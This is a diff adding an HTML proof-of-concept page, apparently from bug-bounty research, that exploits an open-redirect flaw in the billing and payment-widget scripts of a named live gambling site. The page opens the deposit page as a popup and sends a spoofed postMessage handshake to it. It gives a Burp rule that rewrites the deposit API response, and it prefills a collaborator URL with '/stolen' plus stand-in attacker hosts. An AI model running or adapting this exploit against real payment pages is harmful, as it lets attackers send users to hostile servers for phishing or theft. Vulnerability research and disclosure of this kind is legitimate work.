@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<!--
+  PoC 3: Open Redirect via L0() / jI() URL Scheme Bypass — "//evil.com" Protocol-Relative
+
+  VULNERABILITY: In billing-1SVq9ZSc.js, function L0(e):
+    new URL(e, window.location.origin).protocol === "https:"   ← BYPASS
+    → window.location.href = e
+
+  The check resolves protocol-relative URLs ("//evil.com") using current page origin as base.
+  Result: "//evil.com" resolves to "https://evil.com" → protocol check passes → redirect fires.
+
+  SAME BUG in paywidget (jI() function) — identical logic.
+
+  TWO TRIGGER PATHS:
+
+  PATH A — via postMessage to billing.js o8 handler (same-origin only):
+    paywidget (1win.com origin) → postMessage({type:"redirect", payload:{url:"//evil.com"}})
+    → o8 handler checks origin (✓ same-origin) → KC("//evil.com") → L0("//evil.com") → redirect
+
+  PATH B — via Burp intercept of payment API response:
+    Intercept deposit creation response → replace "source" field with "//attacker.com"
+    → paywidget fU() builds URL → Hu() sends to parent → parent KC() → redirect
+
+  PATH C — direct JS call (verify bypass in browser console):
+    new URL("//evil.com", "https://1win.com").protocol  →  "https:"   // PASSES
+    new URL("//evil.com", "https://1win.com").href       →  "https://evil.com/"
+
+  This PoC demonstrates Path A using the opener relationship:
+    1. Victim visits attacker page
+    2. Attacker opens 1win deposit page as popup
+    3. Attacker sends spoofed __WIDGET_READY__ to billing.js (no origin check on Xi())
+    4. Billing.js advances state machine, opens paywidget
+    5. Attacker intercepts / injects redirect via paywidget's kj() postMessage path
+
+  BURP RULE for Path B:
+    - Intercept: POST /api/web/v1/payments/deposits response
+    - Match and Replace (Response Body):
+      Match:   "source":"https://
+      Replace: "source":"//YOUR-COLLABORATOR.NET/
+    - Forward → paywidget redirects parent to your server
+-->
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>PoC 3 - L0() Open Redirect Bypass</title>
+  <style>
+    body { font-family: monospace; background: #1a0a0a; color: #faa; padding: 20px; }
+    h2 { color: #f70; }
+    code { background: #2a0000; padding: 2px 6px; border-radius: 3px; color: #ff9; }
+    .box { background: #000; border: 1px solid #f44; padding: 12px; margin: 10px 0; }
+    #log { height: 300px; overflow-y: auto; }
+    .hit { color: #f00; font-weight: bold; }
+    .evt { color: #fa7; }
+    .warn { color: #ff0; }
+    button { background: #2a0000; color: #faa; border: 1px solid #f44; padding: 8px 16px; cursor: pointer; margin: 4px; }
+    input { background: #1a0000; color: #faa; border: 1px solid #f44; padding: 6px; width: 400px; }
+  </style>
+</head>
+<body>
+  <h2>PoC 3 — L0() / jI() Protocol-Relative Redirect Bypass</h2>
+
+  <div class="box">
+    <b>Console Verification (run in 1win.com browser console):</b><br><br>
+    <code>new URL("//evil.com", window.location.origin).protocol</code>
+    → <code style="color:#0f0">"https:"</code> ✓ (bypass confirmed)<br><br>
+    <code>new URL("//evil.com", window.location.origin).href</code>
+    → <code style="color:#0f0">"https://evil.com/"</code>
+  </div>
+
+  <div class="box">
+    <b>Redirect Target (your collaborator URL):</b><br>
+    <input type="text" id="redirectTarget" value="//68cpgjq66fb78xo71jz18vg0jrpid91y.oastify.com/stolen" placeholder="//attacker.com/path">
+  </div>
+
+  <button onclick="testBypass()">Test L0 Bypass Logic</button>
+  <button onclick="openDepositAndInject()">Open 1win Deposit + Inject (Path A)</button>
+  <button onclick="clearLog()">Clear</button>
+
+  <div class="box" id="log"></div>
+
+  <div class="box">
+    <b>Burp Suite Match-and-Replace Rule (Path B — no popup needed):</b><br><br>
+    Type: <code>Response body</code><br>
+    Scope: <code>https://1win.com/api/web/v1/payments/deposits</code><br>
+    Match: <code>"source":"https://</code><br>
+    Replace: <code>"source":"//YOUR-COLLABORATOR.NET/steal?</code><br><br>
+    <b>Result:</b> After victim initiates deposit → paywidget fires Hu() → parent KC() → window.location.href = "//YOUR-COLLABORATOR.NET/steal?"
+  </div>
+
+<script>
+const TARGET = 'https://1win.com';
+const WIDGET_READY = '__WIDGET_REDIRECT_FORM_READY__';
+let targetWindow = null;
+
+function log(msg, cls = '') {
+  const d = document.getElementById('log');
+  const ts = new Date().toISOString().slice(11, 23);
+  d.innerHTML += `<div class="${cls}">[${ts}] ${msg}</div>`;
+  d.scrollTop = d.scrollHeight;
+}
+
+// Verify the bypass logic locally (simulates L0() check)
+function testBypass() {
+  const url = document.getElementById('redirectTarget').value;
+  const base = 'https://1win.com';
+  try {
+    const resolved = new URL(url, base);
+    log(`Input URL: ${url}`, 'warn');
+    log(`Resolved against ${base}:`, 'warn');
+    log(`  .protocol = "${resolved.protocol}"  → ${resolved.protocol === 'https:' ? '✓ PASSES L0() check' : '✗ Blocked'}`, resolved.protocol === 'https:' ? 'hit' : 'evt');
+    log(`  .href = "${resolved.href}"`, 'evt');
+    if (resolved.protocol === 'https:') {
+      log(`L0() would execute: window.location.href = "${url}"  →  navigates to ${resolved.href}`, 'hit');
+    }
+  } catch(err) {
+    log(`URL parse error: ${err.message}`, 'warn');
+  }
+}
+
+// Path A: Open 1win deposit, spoof WIDGET_READY on parent billing.js
+// billing.js Xi() has no origin check — it will advance state and open paywidget
+window.addEventListener('message', function(e) {
+  log(`MSG from ${e.origin}: ${JSON.stringify(e.data).slice(0,150)}`, 'evt');
+});
+
+function openDepositAndInject() {
+  const redirectUrl = document.getElementById('redirectTarget').value;
+  log(`Opening 1win.com deposit page as popup...`, 'warn');
+
+  targetWindow = window.open(
+    TARGET + '/en/deposit',
+    'target_1win',
+    'width=1200,height=800,top=50,left=0'
+  );
+
+  if (!targetWindow) {
+    log('[ERROR] Popup blocked! Enable popups.', 'warn');
+    return;
+  }
+
+  log('Waiting 4s for 1win deposit page to fully load...', 'warn');
+
+  setTimeout(() => {
+    log(`Sending "${WIDGET_READY}" to 1win deposit popup (Xi() has no origin check)...`, 'warn');
+    // billing.js Xi() listens with no origin check — this spoofs the handshake
+    targetWindow.postMessage(WIDGET_READY, '*');
+    log('Sent. Billing.js Xi() should resolve and advance payment state machine.', 'evt');
+    log('Monitor the popup — paywidget may now open with attacker-influenced state.', 'evt');
+  }, 4000);
+}
+
+function clearLog() {
+  document.getElementById('log').innerHTML = '';
+}
+</script>
+</body>
+</html>
